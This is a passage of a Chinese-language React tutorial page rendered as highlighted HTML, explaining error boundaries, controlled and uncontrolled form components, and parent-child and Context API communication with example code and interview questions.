class="hljs-property">state</span>.<span class="hljs-property">hasError</span><br>      ? <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FallbackComponent</span> /&gt;</span></span><br>      : <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>函数组件解决方案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用第三方库 react-error-boundary</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">ErrorBoundary</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-error-boundary&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> <span class="hljs-attr">FallbackComponent</span>=<span class="hljs-string">&#123;ErrorFallback&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">UnstableComponent</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-受控组件-vs-非受控组件（表单处理）"><a href="#2-3-受控组件-vs-非受控组件（表单处理）" class="headerlink" title="2.3 受控组件 vs. 非受控组件（表单处理）"></a>2.3 受控组件 vs. 非受控组件（表单处理）</h2><h3 id="核心概念对比"><a href="#核心概念对比" class="headerlink" title="核心概念对比"></a>核心概念对比</h3><table><thead><tr><th>特性</th><th>受控组件</th><th>非受控组件</th></tr></thead><tbody><tr><td>数据管理</td><td>React state 完全控制</td><td>DOM 节点自身管理</td></tr><tr><td>值获取</td><td>value 属性</td><td>ref 访问 DOM 节点</td></tr><tr><td>值更新</td><td>onChange 事件 + setState</td><td>用户直接输入</td></tr><tr><td>初始化</td><td>value 属性</td><td>defaultValue&#x2F;defaultChecked</td></tr><tr><td>表单提交</td><td>从 state 获取</td><td>从 ref 获取</td></tr><tr><td>实时验证</td><td>容易实现</td><td>需要手动监听事件</td></tr><tr><td>适用场景</td><td>复杂表单、即时验证</td><td>简单表单、文件上传</td></tr></tbody></table><h3 id="受控组件深度解析"><a href="#受控组件深度解析" class="headerlink" title="受控组件深度解析"></a>受控组件深度解析</h3><p><strong>实现原理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ControlledForm</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [value, setValue] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChange</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>    <span class="hljs-title function_">setValue</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>); <span class="hljs-comment">// 完全控制输入值</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;value&#125;</span>       // <span class="hljs-attr">值绑定</span> <span class="hljs-attr">state</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;handleChange&#125;</span> // <span class="hljs-attr">更新</span> <span class="hljs-attr">state</span></span></span><br><span class="hljs-tag"><span class="language-xml">    /&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>多字段优化模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MultiFieldForm</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [formData, setFormData] = <span class="hljs-title function_">useState</span>(&#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-attr">email</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;&#x27;</span><br>  &#125;);<br><br>  <span class="hljs-comment">// 通用变更处理器</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChange</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> &#123; name, value &#125; = e.<span class="hljs-property">target</span>;<br>    <span class="hljs-title function_">setFormData</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (&#123; ...prev, [name]: value &#125;));<br>  &#125;;<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;formData.name&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;handleChange&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;formData.email&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;handleChange&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>即时验证示例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">EmailInput</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [email, setEmail] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <span class="hljs-keyword">const</span> [isValid, setIsValid] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChange</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> value = e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>;<br>    <span class="hljs-title function_">setEmail</span>(value);<br>    <span class="hljs-title function_">setIsValid</span>(<span class="hljs-regexp">/^[^\s@]+@[^\s@]+\.[^\s@]+$/</span>.<span class="hljs-title function_">test</span>(value)); <span class="hljs-comment">// 实时验证</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;email&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;handleChange&#125;</span> /&gt;</span></span><br><span class="language-xml">      &#123;!isValid &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>邮箱格式错误<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="非受控组件深度解析"><a href="#非受控组件深度解析" class="headerlink" title="非受控组件深度解析"></a>非受控组件深度解析</h3><p><strong>实现原理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">UncontrolledForm</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>    e.<span class="hljs-title function_">preventDefault</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(inputRef.<span class="hljs-property">current</span>.<span class="hljs-property">value</span>); <span class="hljs-comment">// 提交时获取值</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">&#123;handleSubmit&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputRef&#125;</span>          // <span class="hljs-attr">绑定</span> <span class="hljs-attr">ref</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">defaultValue</span>=<span class="hljs-string">&quot;初始值&quot;</span>   // <span class="hljs-attr">仅初始值</span></span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>文件上传场景（必须使用非受控）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">FileUpload</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> fileRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> file = fileRef.<span class="hljs-property">current</span>.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-comment">// 处理文件...</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;fileRef&#125;</span> /&gt;</span> &#123;/* 无法受控 */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleSubmit&#125;</span>&gt;</span>上传<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>第三方库集成</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">RichTextEditor</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> editorRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 初始化第三方编辑器</span><br>    <span class="hljs-keyword">const</span> editor = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThirdPartyEditor</span>(editorRef.<span class="hljs-property">current</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> editor.<span class="hljs-title function_">destroy</span>();<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;editorRef&#125;</span> /&gt;</span></span>; <span class="hljs-comment">// 非受控管理</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高频面试题与破解方案-3"><a href="#高频面试题与破解方案-3" class="headerlink" title="高频面试题与破解方案"></a>高频面试题与破解方案</h3><p><strong>Q：为什么文件输入必须用非受控组件？</strong></p><ul><li>安全限制：浏览器禁止 JavaScript 设置文件输入值（<code>&lt;input type=&quot;file&quot;&gt;</code>）</li><li>只读属性：文件路径由用户选择，程序无法控制</li><li>数据获取：只能通过 ref.current.files 获取文件对象</li></ul><p><strong>Q：受控组件相比非受控有何优势？</strong></p><ul><li>即时验证：每次输入都可触发验证逻辑</li><li>条件渲染：基于输入值动态控制其他 UI</li><li>状态追溯：完整的状态历史记录</li><li>表单重置：轻松实现 reset 功能（setState(‘’)）</li></ul><p><strong>Q：如何实现表单重置功能？</strong></p><p>受控组件方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ResettableForm</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [form, setForm] = <span class="hljs-title function_">useState</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-attr">email</span>: <span class="hljs-string">&#x27;&#x27;</span> &#125;);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReset</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">setForm</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-attr">email</span>: <span class="hljs-string">&#x27;&#x27;</span> &#125;); <span class="hljs-comment">// 重置 state</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;form.name&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;/*...*/&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleReset&#125;</span>&gt;</span>重置<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>非受控组件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ResettableForm</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> formRef = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReset</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    formRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">reset</span>(); <span class="hljs-comment">// 调用原生 DOM reset</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;formRef&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">defaultValue</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleReset&#125;</span>&gt;</span>重置<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-4-组件通信（父子通信、Context-API、事件总线）"><a href="#2-4-组件通信（父子通信、Context-API、事件总线）" class="headerlink" title="2.4 组件通信（父子通信、Context API、事件总线）"></a>2.4 组件通信（父子通信、Context API、事件总线）</h2><h3 id="组件通信方式全景图"><a href="#组件通信方式全景图" class="headerlink" title="组件通信方式全景图"></a>组件通信方式全景图</h3><pre class="mermaid">graph TD  A[组件通信] --> B[父子组件]  A --> C[兄弟组件]  A --> D[祖孙组件]  A --> E[任意组件]    B --> B1[Props/回调函数]  C --> C1[状态提升]  C --> C2[通过共同父组件]  D --> D1[Context API]  D --> D2[逐层传递Props]  E --> E1[事件总线]  E --> E2[状态管理库]</pre><h3 id="父子组件通信（Props-回调）"><a href="#父子组件通信（Props-回调）" class="headerlink" title="父子组件通信（Props + 回调）"></a>父子组件通信（Props + 回调）</h3><p><strong>基础模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 父组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChildData</span> = (<span class="hljs-params">childData</span>) =&gt; &#123;<br>    <span class="hljs-title function_">setData</span>(childData);<br>  &#125;;<br><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">onDataSend</span>=<span class="hljs-string">&#123;handleChildData&#125;</span> /&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// 子组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">&#123; onDataSend &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> onDataSend(&#x27;Hello&#x27;)&#125;&gt;发送数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>多层透传问题</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 祖孙组件通信（不推荐）</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Grandparent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Parent</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span></span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params">&#123; data &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span></span>; <span class="hljs-comment">// 中间层被迫传递</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">&#123; data &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;data&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>痛点：Props drilling（属性钻探）导致代码冗余</p><h3 id="Context-API-深度解析"><a href="#Context-API-深度解析" class="headerlink" title="Context API 深度解析"></a>Context API 深度解析</h3><p><strong>核心三要素</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. 创建Context</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-string">&#x27;light&#x27;</span>); <span class="hljs-comment">// 默认值</span><br><br><span class="hljs-comment">// 2. Provider 提供数据</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;dark&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">theme</span>, <span class="hljs-attr">setTheme</span> &#125;&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Toolbar</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 3. Consumer 消费数据（两种方式）</span><br><span class="hljs-comment">// 方式1：useContext Hook</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; theme &#125; = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span>按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// 方式2：Context.Consumer</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Consumer</span>&gt;</span></span><br><span class="language-xml">      &#123;(&#123; theme &#125;) =&gt; <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span>按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Consumer</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>性能优化策略</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 错误写法：直接传递对象</span><br>&lt;<span class="hljs-title class_">MyContext</span>.<span class="hljs-property">Provider</span> value=&#123;&#123; theme, setTheme &#125;&#125;&gt;<br>  ...<br>&lt;/<span class="hljs-title class_">MyContext</span>.<span class="hljs-property">Provider</span>&gt;<br><br><span class="hljs-comment">// ✅ 正确方案：useMemo 缓存值</span><br><span class="hljs-keyword">const</span> contextValue = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> (&#123; theme, setTheme &#125;), [theme]);<br><span class="hljs-keyword">return</span> (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">MyContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;contextValue&#125;</span>&gt;</span></span><br><span class="language-xml">    ...</span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">MyContext.Provider</span>&gt;</span></span><br>);<br></code></pre></td></tr></table></figure><p><strong>多层Context嵌套</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;<span class="hljs-title class_">UserContext</span>.<span class="hljs-property">Provider</span> value=&#123;user&#125;&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span 